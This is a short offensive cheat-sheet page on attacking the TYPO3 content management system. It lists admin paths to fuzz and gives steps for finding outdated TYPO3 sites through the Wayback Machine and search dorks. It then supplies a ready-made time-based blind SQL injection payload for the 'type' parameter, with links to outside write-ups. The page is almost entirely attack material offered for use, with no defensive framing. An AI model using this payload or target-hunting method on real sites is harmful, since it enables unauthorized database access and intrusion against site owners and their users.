---
description: TYPO3 is a free enterprise-class CMS based on PHP
---

# Typo3

### Admin panel path

```
/fileadmin
/typo3
/typo3conf
/typo3temp
```

Try Fuzzing admin path

### SQL injection in old version

```
Find web use typo3 old version
-> waybackmachine / dork
find parameter type
?type=sql injection

Payload:
-1+OR+3 AND if(now()=sysdate(),SLEEP(9),0)-- wXyW2 AND if(now()=sysdate(),SLEEP(9),0)-- wXyW1=6 +AND+000762=000762
```

{% embed url="https://x.com/ynsmroztas/status/1792963918702489950" %}
sql injection typo3
{% endembed %}



```
https://www.ambionics.io/blog/typo3-news-module-sqli
```
